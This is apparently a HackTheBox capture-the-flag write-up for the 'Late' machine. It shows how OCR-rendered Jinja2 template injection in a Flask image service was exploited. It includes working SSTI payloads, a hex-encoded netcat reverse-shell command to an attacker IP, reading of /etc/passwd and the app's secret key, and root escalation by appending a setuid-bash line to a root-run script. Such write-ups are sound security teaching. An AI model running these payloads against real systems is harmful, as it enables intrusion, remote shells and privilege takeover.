> Author: **[kavigihan][author-profile]**

## Discovery

### Port scanning

```shell
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.6 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 02:5e:29:0e:a3:af:4e:72:9d:a4:fe:0d:cb:5d:83:07 (RSA)
|   256 41:e1:fe:03:a5:c7:97:c4:d5:16:77:f3:41:0c:e9:fb (ECDSA)
|_  256 28:39:46:98:17:1e:46:1a:1e:a1:ab:3b:9a:57:70:48 (ED25519)
80/tcp open  http    nginx 1.14.0 (Ubuntu)
| http-methods: 
|_  Supported Methods: GET HEAD
|_http-title: Late - Best online image tools
|_http-favicon: Unknown favicon MD5: 1575FDF0E164C3DB0739CF05D9315BDF
|_http-server-header: nginx/1.14.0 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

```shell
PORT     STATE         SERVICE
5353/udp open|filtered zeroconf
```

### Enumeration

Directories:

```
/assets               (Status: 301) [Size: 194] [--> http://late.htb/assets/]
/.                    (Status: 301) [Size: 194] [--> http://late.htb/./]
```

Vhosts:

```
Found: images.late.htb (Status: 200) [Size: 2187]
```

### Web browsing

#### The frontpage

The website is promoting an image editing tool:

![][screenshot-frontpage]

There's an emphasis on text fonts:

> "add text to a photo, with your OWN fonts"

Nothing 

#### The image editing webservice

The tool is located at [images.late.htb][webservice-url]:

![][screenshot-webservice]

For some reason the framework is given: Flask.

After uploading a screenshot of itself, the server responds with a "results.txt":

```html
<p>Convert image to textures
If you want to turn an image into a text document, you came to the right place.
Convert your image now!
Choose file Browse
SCAN IMAGE
</p>
```

So the server performs OCR on the image and injects the text in a HTML template.

## Fuzzing

### The file name

To minimize the size of the request, we send a single pixel to the server:

```html
<img src="data:image/gif;base64,R0lGODlhAQABAAAAACH5BAEAAAAALAAAAAABAAEAAAIBAAA=">
```

The result is 35 bytes:

```
00000000: 4749 4638 3961 0100 0100 0000 0021 f904  GIF89a.......!..
00000010: 0100 0000 002c 0000 0000 0100 0100 0002  .....,..........
00000020: 0100 00
```

```shell
curl -i -s -k -X $'POST' \
    -H $'Host: images.late.htb' -H $'Content-Length: 213' \
    -H $'Content-Type: multipart/form-data; boundary=----WebKitFormBoundary5ryKAss6uBYa1TI2' \
    -H $'Accept-Encoding: gzip, deflate'\
    --data-binary $'------WebKitFormBoundary5ryKAss6uBYa1TI2\x0d\x0aContent-Disposition: form-data; name=\"file\"; filename=\"p.gif\"\x0d\x0aContent-Type: image/gif\x0d\x0a\x0d\x0aGIF89a\x01\x00\x01\x00\x00\x00\x00!\xf9\x04\x01\x00\x00\x00\x00,\x00\x00\x00\x00\x01\x00\x01\x00\x00\x02\x01\x00\x00\x0d\x0a------WebKitFormBoundary5ryKAss6uBYa1TI2--\x0d\x0a' \
    $'http://images.late.htb/scanner'
```

But the server rejects GIF:

```
Invalid Extension
```

Which can be bypassed by simply renaming the file without changing its data:

```
Error occured while processing the image: cannot identify image file '/home/svc_acc/app/uploads/p.jpg1725'
```

So the service is running as the user "svc_acc".

The uploads folder cannot be reached though.

Fuzzing for special characters and command injection in the filename fails.

### The image content

Using the Chrome dev tools, we can easily generate images with any text by
editing the webpage itself.

First we insert a HTML tag:

```html
<span>whoami</span>
```

The span has exactly the size on its content so it will produce the smallest
image. Next right click on the element in the dev tool and select "capture node screenshot".

As seen earlier, the OCR recognizes the font of its own page:

```html
<p>whoami
</p>
```

Since it insisted on the framework and the result is in HTML, SSTI comes to mind:

![][ssti-test]

Template injection works:

```html
<p>49
</p>
```

## Building non ambiguous payloads

### The OCR filter

Flask leverages Jinja2, for which [HackTricks][hacktricks] has a wealth of payloads:

```
{{ ''.__class__.__mro__[2].__subclasses__()[40]('/etc/passwd').read() }}
```

But the output shows that the interpretation broke:

```
<p>)__[2].__subclasses__()[40](‘/etc/passwd').read() }}
</p>
```

Removing the surrounding brackets and sending the image again results in:

```
<p>"_class__.__mro__[2].__subclasses__()[40]('/etc/passwd’).read()
</p>
```

The OCR is actually making a few mistakes:

- the adjacent single quotes are seen as a double quote
- there are missing dots and underlines

### Lowering the confusion between characters

Bold fonts and increasing the font size improve the precision overall.

This can be done by encapsulating the payload in a `<h4>` tag:

```html
<h4 align="center" style="white-space: nowrap;min-width: 2048px; font-family: 'Roboto Mono', monospace;">
{{ request | attr ( "application" ) | attr ( "\x5f\x5fglobals\x5f\x5f" ) | attr ( "\x5f\x5fbuiltins\x5f\x5f" ) }}
</h4>
```
Still, many characters can be confused visually:

- `0` and `O`
- `I`, `l` and `1`
- `e` and `c`

### Maximizing the payload interpretability

The monospace helped a lot with character separation. A few extra spaces can
prevent the OCR from fusing adjacent symbols into one, like the single quotes.

Usually base64 is useful to reduce the character set and avoid special / filtered
characters.

Here the issue is mostly with lower case characters.

So we can use uppercase HEX to express the payload:

```shell
# 6E632031302E31302E31362E342038383838202D65202F62696E2F62617368
echo -n 'nc 10.10.16.4 8888 -e /bin/bash' | xxd -p -u -c 1024
```

## SSTI exploitation

### Grabbing informations

Starting with a simpler payload like `{{ config.items() }}`:

```
<p>dict_items([(&#39;ENV&#39;, &#39;production&#39;), (&#39;DEBUG&#39;, False), (&#39;TESTING&#39;, False), (&#39;PROPAGATE_EXCEPTIONS&#39;, None), (&#39;PRESERVE_CONTEXT_ON_EXCEPTION&#39;, None), (&#39;SECRET_KEY&#39;, b&#39;_5#y2L&#34;F4Q8z\n\xec]/&#39;), (&#39;PERMANENT_SESSION_LIFETIME&#39;, datetime.timedelta(31)), (&#39;USE_X_SENDFILE&#39;, False), (&#39;SERVER_NAME&#39;, None), (&#39;APPLICATION_ROOT&#39;, &#39;/&#39;), (&#39;SESSION_COOKIE_NAME&#39;, &#39;session&#39;), (&#39;SESSION_COOKIE_DOMAIN&#39;, False), (&#39;SESSION_COOKIE_PATH&#39;, None), (&#39;SESSION_COOKIE_HTTPONLY&#39;, True), (&#39;SESSION_COOKIE_SECURE&#39;, False), (&#39;SESSION_COOKIE_SAMESITE&#39;, None), (&#39;SESSION_REFRESH_EACH_REQUEST&#39;, True), (&#39;MAX_CONTENT_LENGTH&#39;, None), (&#39;SEND_FILE_MAX_AGE_DEFAULT&#39;, None), (&#39;TRAP_BAD_REQUEST_ERRORS&#39;, None), (&#39;TRAP_HTTP_EXCEPTIONS&#39;, False), (&#39;EXPLAIN_TEMPLATE_LOADING&#39;, False), (&#39;PREFERRED_URL_SCHEME&#39;, &#39;http&#39;), (&#39;JSON_AS_ASCII&#39;, True), (&#39;JSON_SORT_KEYS&#39;, True), (&#39;JSONIFY_PRETTYPRINT_REGULAR&#39;, False), (&#39;JSONIFY_MIMETYPE&#39;, &#39;application/json&#39;), (&#39;TEMPLATES_AUTO_RELOAD&#39;, None), (&#39;MAX_COOKIE_SIZE&#39;, 4093)])
</p>
```

After translating the escaped characters back:

```python
dict_items([
    ('ENV', 'production'),
    ('DEBUG', False),
    ('TESTING', False),
    ('PROPAGATE_EXCEPTIONS', None),
    ('PRESERVE_CONTEXT_ON_EXCEPTION', None),
    ('SECRET_KEY', b'_5#y2L"F4Q8z\n\xec]/'),
    ('PERMANENT_SESSION_LIFETIME', datetime.timedelta(31)),
    ('USE_X_SENDFILE', False),
    ('SERVER_NAME', None),
    ('APPLICATION_ROOT', '/'),
    ('SESSION_COOKIE_NAME', 'session'),
    ('SESSION_COOKIE_DOMAIN', False),
    ('SESSION_COOKIE_PATH', None),
    ('SESSION_COOKIE_HTTPONLY', True),
    ('SESSION_COOKIE_SECURE', False),
    ('SESSION_COOKIE_SAMESITE', None),
    ('SESSION_REFRESH_EACH_REQUEST', True),
    ('MAX_CONTENT_LENGTH', None),
    ('SEND_FILE_MAX_AGE_DEFAULT', None),
    ('TRAP_BAD_REQUEST_ERRORS', None),
    ('TRAP_HTTP_EXCEPTIONS', False),
    ('EXPLAIN_TEMPLATE_LOADING', False),
    ('PREFERRED_URL_SCHEME', 'http'),
    ('JSON_AS_ASCII', True),
    ('JSON_SORT_KEYS', True),
    ('JSONIFY_PRETTYPRINT_REGULAR', False),
    ('JSONIFY_MIMETYPE', 'application/json'),
    ('TEMPLATES_AUTO_RELOAD', None),
    ('MAX_COOKIE_SIZE', 4093)])
```

### Embedding a payload in an image

As seen earlier, a command can be encoded in HEX:

```shell
# encode
echo -n 'cat /etc/passwd' | xxd -p -u -c 1024
# decode
echo -n 636174202F6574632F706173737764 | xxd -r -p -c 1024 | bash
```

And then in an image by capturing a "node screenshot" of:

```html
<h4 align="center">
{{ request.application.__globals__.__builtins__.__import__("os").popen("echo -n 636174202F6574632F706173737764 | xxd -r -p -c 1024 | bash ").read() }}
</h4>
```

We get:

![][image-payload]

Feeding this image payload to the webservice gives:

```
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
systemd-network:x:100:102:systemd Network Management,,,:/run/systemd/netif:/usr/sbin/nologin
systemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd/resolve:/usr/sbin/nologin
syslog:x:102:106::/home/syslog:/usr/sbin/nologin
messagebus:x:103:107::/nonexistent:/usr/sbin/nologin
_apt:x:104:65534::/nonexistent:/usr/sbin/nologin
lxd:x:105:65534::/var/lib/lxd/:/bin/false
uuidd:x:106:110::/run/uuidd:/usr/sbin/nologin
dnsmasq:x:107:65534:dnsmasq,,,:/var/lib/misc:/usr/sbin/nologin
landscape:x:108:112::/var/lib/landscape:/usr/sbin/nologin
pollinate:x:109:1::/var/cache/pollinate:/bin/false
sshd:x:110:65534::/run/sshd:/usr/sbin/nologin
svc_acc:x:1000:1000:Service Account:/home/svc_acc:/bin/bash
rtkit:x:111:114:RealtimeKit,,,:/proc:/usr/sbin/nologin
usbmux:x:112:46:usbmux daemon,,,:/var/lib/usbmux:/usr/sbin/nologin
avahi:x:113:116:Avahi mDNS daemon,,,:/var/run/avahi-daemon:/usr/sbin/nologin
cups-pk-helper:x:114:117:user for cups-pk-helper service,,,:/home/cups-pk-helper:/usr/sbin/nologin
saned:x:115:119::/var/lib/saned:/usr/sbin/nologin
colord:x:116:120:colord colour management daemon,,,:/var/lib/colord:/usr/sbin/nologin
pulse:x:117:121:PulseAudio daemon,,,:/var/run/pulse:/usr/sbin/nologin
geoclue:x:118:123::/var/lib/geoclue:/usr/sbin/nologin
smmta:x:119:124:Mail Transfer Agent,,,:/var/lib/sendmail:/usr/sbin/nologin
smmsp:x:120:125:Mail Submission Program,,,:/var/lib/sendmail:/usr/sbin/nologin
```

The encoding can be eased with:

```shell
echo -n 'echo -n "$@" | xxd -p -u -c 1024' > encode.sh 
chmod +x encode.sh
```

```shell
# 6D6B646972202E737368
./encode.sh mkdir .ssh
```

## Rooting

The user has Ssh credentials, which can be used to log as `svc_acc`.

Running [LinPEAS][linpeas] returns:

```
You own the script: /usr/local/sbin/ssh-alert.sh
```

```shell
#!/bin/bash

RECIPIENT="root@late.htb"
SUBJECT="Email from Server Login: SSH Alert"

BODY="
A SSH login was detected.

        User:        $PAM_USER
        User IP Host: $PAM_RHOST
        Service:     $PAM_SERVICE
        TTY:         $PAM_TTY
        Date:        `date`
        Server:      `uname -a`
"

if [ ${PAM_TYPE} = "open_session" ]; then
        echo "Subject:${SUBJECT} ${BODY}" | /usr/sbin/sendmail ${RECIPIENT}
fi
```

[Pspy][pspy] shows that the script is run by root and it is editable by `svc_acc`:

```shell
echo 'chmod u+s /bin/bash' >> /usr/local/sbin/ssh-alert.sh
```

It is launched on successful ssh logins, which is easy to trigger.

```shell
/bin/bash -p
```

[author-profile]: https://app.hackthebox.com/users/389926
[hacktricks]: https://book.hacktricks.xyz/pentesting-web/ssti-server-side-template-injection
[image-payload]: images/image-payload.png
[linpeas]: https://github.com/carlospolop/PEASS-ng/tree/master/linPEAS
[pspy]: https://github.com/DominicBreuker/pspy
[screenshot-frontpage]: images/screenshot-frontpage.png
[screenshot-webservice]: images/screenshot-webservice.png
[ssti-vector]: images/ssti-test.png
[webservice-url]: http://images.late.htb
